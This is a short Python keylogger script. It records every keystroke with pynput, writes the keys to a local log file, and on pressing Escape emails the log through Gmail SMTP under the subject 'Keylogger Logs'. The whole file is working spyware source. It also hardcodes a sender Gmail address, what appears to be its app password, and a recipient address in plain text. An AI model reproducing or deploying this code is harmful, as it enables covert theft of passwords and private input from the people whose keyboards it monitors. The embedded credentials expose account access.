import pynput
from pynput.keyboard import Key, Listener
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

keys = []
log_file = 'log.txt'

# Email Configuration
email_address = "abdullah.stmu@gmail.com"  # Your email address
email_password = "hejj lmpj jmlw jzth"    # Your email password or app-specific password
recipient_email = "abdulhannansheikh648@gmail.com"  # Recipient's email address
smtp_server = "smtp.gmail.com"
smtp_port = 587

def on_press(key):
    keys.append(key)
    write_file(keys)
    try:
        print('Alphanumeric key {0} pressed '.format(key.char))
    except AttributeError:
        print('Special key {0} pressed '.format(key))

def write_file(keys):
    with open(log_file, 'a') as f:  # Append logs to the file
        for key in keys:
            k = str(key).replace("'", "")
            if "Key" in k:
                f.write(f"[{k.replace('Key.', '').upper()}]")  # Format special keys
            else:
                f.write(k)
        keys.clear()  

# Function to send the log file via email
def send_email():
    try:
        with open(log_file, 'r') as f:
            logs = f.read()

        # Email message setup
        msg = MIMEMultipart()
        msg['From'] = email_address
        msg['To'] = recipient_email
        msg['Subject'] = 'Keylogger Logs'
        msg.attach(MIMEText(logs, 'plain'))

        # Sending the email
        server = smtplib.SMTP(smtp_server, smtp_port)
        server.starttls()
        server.login(email_address, email_password)
        server.send_message(msg)
        server.quit()
        print("Logs sent via email successfully!")
    except Exception as e:
        print(f"Failed to send logs via email: {e}")

def on_release(key):
    print('{0} released '.format(key))
    if key == Key.esc:
        send_email()  # Send email when the keylogger stops
        return False  # Stop the listener

# Start listening for key events
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
